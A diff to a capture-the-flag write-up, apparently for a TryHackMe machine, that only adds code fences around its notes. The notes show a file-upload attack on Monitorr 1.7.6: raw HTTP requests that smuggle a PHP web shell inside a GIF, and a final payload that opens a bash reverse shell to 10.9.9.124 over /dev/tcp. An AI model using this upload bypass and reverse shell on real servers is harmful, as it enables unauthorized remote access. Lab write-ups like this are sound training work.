@@ -13,7 +13,7 @@ Looking for searchsploit Monitor 1.7.6 found exploit
 https://www.exploit-db.com/exploits/48980
 
 ## Payloads
-
+```
 POST /assets/php/upload.php HTTP/1.1
 Host: monitorr.robyns-petshop.thm
 Cookie: isHuman=1; PHPSESSID=98ke6a48lckc25sb87jmru2el7
@@ -66,10 +66,10 @@ GIF89a213213123<?php
 view-source:https://monitorr.robyns-petshop.thm/assets/data/usrimg/she_ll5.gif.phtml?c=ls%20-al%20/opt/ssh-honeypot
 
 cat /opt/ssh-honeypot/README.md
-
+```
 
 # FINAL PAYLOAD 
-
+```
 POST /assets/php/upload.php HTTP/1.1
 Host: monitorr.robyns-petshop.thm
 Cookie: isHuman=1; PHPSESSID=98ke6a48lckc25sb87jmru2el7
@@ -94,7 +94,7 @@ GIF89a213213123
 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.9.9.124/443 0>&1'");?> 
 -----------------------------31046105003900160576454225745--
 
-
+```
 # First Access
 
 after running Linpeas.sh in SGID section found snapd with suid
